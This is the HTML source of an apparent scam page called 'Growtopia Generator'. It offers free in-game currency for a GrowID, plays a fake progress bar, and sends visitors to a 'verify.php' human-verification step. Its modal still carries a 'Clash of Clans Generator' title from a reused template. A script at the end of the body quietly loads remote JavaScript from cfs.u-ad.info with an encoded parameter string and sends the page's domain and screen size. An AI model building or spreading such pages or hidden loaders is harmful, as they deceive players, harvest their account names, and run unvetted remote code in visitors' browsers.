<!DOCTYPE html>
<html>
<head>
<link rel="shortcut icon" href="http://growtopiagame.com/favicon.ico" />

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="author" content="RadenHilmanNS" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    
    <meta property="og:description" content="" />
    <meta property="og:image" content="" />
    <meta property="og:title" content="" />
    
    <title>Growtopia Generator</title>

    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.superhero.css">
    <link rel="stylesheet" type="text/css" href="css/standard.css">
    
    <script type="text/javascript" src="js/jquery-1.10.2.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script type="text/javascript">
      var X00Unique = 'COC_02_d98094691d';
      var X00CountdownMinutesStart = 15;
      var X00CountdownSecondsStart = 60;
	  $(document).ready(function(){
		$('[data-toggle="popover"]').popover();  
	  });
    </script>
    <script type="text/javascript" src="js/standard.js"></script>
  </head>
  
  <body>

    <div id="X00WrapperMain">
            
      
      <div style="margin: 20px 0; text-align: center; padding: 15px;">
        <img id="X00ImageHeader" src="https://lh3.googleusercontent.com/-qq3gImbCNtE/WCm6I2N7WEI/AAAAAAAAAgM/V2V9NdxaqmY/%25255BUNSET%25255D.png" alt="" />
        <div style="text-align: right;">
          <span class="label label-default" style="font-weight: bold;"></span>
        </div>
      </div>
      <div id="X00WrapperStart" class="panel panel-default">
        <div class="panel-heading">
          <div class="form-group" style="margin-bottom: 10px;">
            <label class="control-label">Enter your  GrowID here!</label>
            <div class="input-group">
              <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
              <input id="X00InputUsername" type="text" class="form-control name" placeholder="Enter your GrowID here!" />
            </div>
          </div>
          
            <div class="form-group" style="margin-bottom: 0;">
            <label class="control-label">Choose your amount of Gems</label>
            <div class="input-group">
              <span class="input-group-addon"><img src="https://lh3.googleusercontent.com/-EDfKR0oB8fE/WCng0Leo6XI/AAAAAAAAAi4/7VncuKZxpsg/%25255BUNSET%25255D.png" alt="" /></span>
              <select class="form-control" id="X00InputGems">
			    <option><i>Choose your amount of Gems</i></option>
                <option>50000</option>
                <option>500000</option>
                <option>5000000</option>
                <option>50000000</option>
				<option>500000000</option>
                <option>Nothing</option>
              </select>
              </span>
            </div>
          </div>
		  
          <div class="form-group" style="margin-bottom: 0;">
            <label class="control-label">Choose your amount of World Lock</label>
            <div class="input-group">
              <span class="input-group-addon"><img src="https://lh3.googleusercontent.com/-IHe2RN4sEQk/WCnchLdxa1I/AAAAAAAAAhw/DyAcCvbomUc/%25255BUNSET%25255D.png" alt="" /></span>
              <select class="form-control" id="X00InputGems">
			  	<option><i>Choose your amount of World Lock</i></option>
                <option>25.000</option>
                <option>50</option>
                <option>100</option>
                <option>150</option>
				<option>200</option>
                <option>Nothing</option>
              </select>
              </span>
            </div>
          </div>
		  
          <div class="form-group" style="margin-bottom: 0;">
            <label class="control-label">Choose your amount of Token</label>
            <div class="input-group">
              <span class="input-group-addon"><img src="https://lh3.googleusercontent.com/-hHh_DJ7E1KE/WCngi_VTHLI/AAAAAAAAAi0/_04FLCuPH1k/%25255BUNSET%25255D.png" alt="" /></span>
              <select class="form-control" id="X00InputWood">
			    <option><i>Choose your amount of Token</i></option>
                <option>25</option>
                <option>50</option>
                <option>100</option>
                <option>150</option>
				<option>200</option>
                <option>Nothing</option>
              </select>
              </span>
            </div>
          </div>
		  
		  <div class="form-group" style="margin-bottom: 0;">
            <label class="control-label">Choose your amount of Diamond Lock</label>
            <div class="input-group">
              <span class="input-group-addon"><img src="https://lh3.googleusercontent.com/-jyR1wBRvFmI/WCncnMIqZHI/AAAAAAAAAiQ/ckUFJzSSQP0/%25255BUNSET%25255D.png" alt="" /></span>
              <select class="form-control" id="X00InputWood">
			    <option><i>Choose your amount of Diamond Lock</i></option>
                <option>25</option>
                <option>50</option>
                <option>100</option>
                <option>150</option>
				<option>200</option>
                <option>Nothing</option>
              </select>
              </span>
            </div>
          </div><br><center>
          
          
		  		<span id="X00WrapperButtonStart" class="input-group-btn" style="display: none;"><b> 
                <button id="X00ButtonStart" class="btn btn-success" type="button" style=""><b>Generate Now!</b></button></center>
        </div>
        <div class="panel-footer small">
          <span class="label label-default" style="font-weight: bold;">Info</span> <span class="label label-default">Be sure that you will enter your GrowID correctly!</span>
        </div>
      </div>
      <div id="X00WrapperProcess" class="panel panel-default" style="display: none;">
        <div class="panel-heading">
          <h3 class="panel-title"><i class="glyphicon glyphicon-refresh" style="margin-right: 10px;"></i> Processing... Please wait!</h3>
        </div>
        <div class="panel-body">
          <div id="X00ProgressText" class="text-center">Loading...</div>
        </div>
        <div class="panel-footer">
          <div class="progress progress-striped active" style="margin-bottom: 5px;">
            <div id="X00ProgressBar" class="progress-bar progress-bar-warning" style="width: 0%"></div>
          </div>
        </div>
      </div>
      <div id="X00WrapperDone" class="panel panel-default" style="display: none;">
        <div class="panel-heading">
          <h3 class="panel-title"><i class="glyphicon glyphicon-ok" style="margin-right: 10px;"></i> Almost done!</h3>
        </div>
         <div class="panel-body">
          Attention! You must confirm that you are a real human! so click on Verify!
        </div>
        <div class="panel-footer text-center">
            <div class="btn-group" role="group">
              
            
			  <a class="btn btn-primary" href="verify.php" id="X00ButtonOffers">Verify Now!</a>
            </div>
            </div>
      </div>
      <div class="panel panel-default" style="">
        <div class="panel-heading">
          <h3 class="panel-title"><i class="glyphicon glyphicon-fire" style="margin-right: 10px;"></i> Latest Activities</h3>
        </div>
        <div id="X00Activities" class="panel-body">
          <!-- -->
        </div>
        <div class="panel-footer small">
          <span class="label label-default"><strong>Info</strong></span> <span class="label label-default">Activities are delayed due to high traffic</span>
        </div>
      </div>
      <div class="small text-center">
        Growtopia Generator ©  All rights reserved.
      </div>
    </div>
    
    <div id="X00Modal01" class="modal fade" style="">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <button id="X00ButtonClose" type="button" class="close" data-dismiss="modal" aria-hidden="true">Ã—</button>
            <h5 class="modal-title">Clash of Clans Generator</h5>
          </div>
          <div class="modal-body">
            Are you sure you want to add <span style="padding: 0 5px;"><img src="https://lh3.googleusercontent.com/-EDfKR0oB8fE/WCng0Leo6XI/AAAAAAAAAi4/7VncuKZxpsg/%25255BUNSET%25255D.png" alt="" style="position: relative; top: -2px;"/> <span id="X00Gems" style="font-weight: bold;"></span></span> including the other resources/amount you requested for your username ?<span style="padding: 0 5px;">"<span id="X00Username" style="font-weight: bold;"></span>"</span>?
          </div>
          <div class="modal-footer">
            <button id="X00ButtonCancel" type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
            <button id="X00ButtonContinue" type="button" class="btn btn-success">Yes</button>
          </div>
        </div>
      </div>
    </div>
    
    

<script type="text/javascript">
	
	function loadit(sel)
	{    
        
    val1 = document.getElementById("X00InputEMAIL").value;
    
     jQuery("#lolol").load("store308d308d308d308d308d308d.html?email=" + val1);
     
    }
	</script> 
	
	
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bqWuUApwhmSZ3O9x1cTXZ07M323oAdR1jewhcvGMeSdpECFSecYzSHVGU21beTA0g4w0wB3rAqElbfHPMMf77F2n1Pc34HH0oMYf70rV3eqGrWw1vf67JrtheGVEA53uTps7UuLJZu8tRC%2fH0NpsXKbHvfMXw8ySoVUEyAAvSywAQAMEhGx4FeCkuIQ8kFSb7MfEKBpYup1X%2fCvdwxqzg6RmrkqlybLnafO2LKZzRsuyz1%2bHBK2wrYrMlQP5mx34XcQnWf4ZucCDaNnGR8mhpB2zwglyYvKoZXsuIi8Z57VYK4eiFE9sAj1ukbdeAq%2fiEEuZjEG1PyPYBnXuY2fQQmgwp3UtGuXcEiArbvAiAayWYP7HYRnwZ7u%2bYHbVPf06xixd7%2b%2b5x0caG28Gz1p8Tbq%2fZ%2bIkdxQul2TUnz1%2blXH8rpM9AE%2fhxQmzvcfKezIGfSsAk7pHUz3s%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>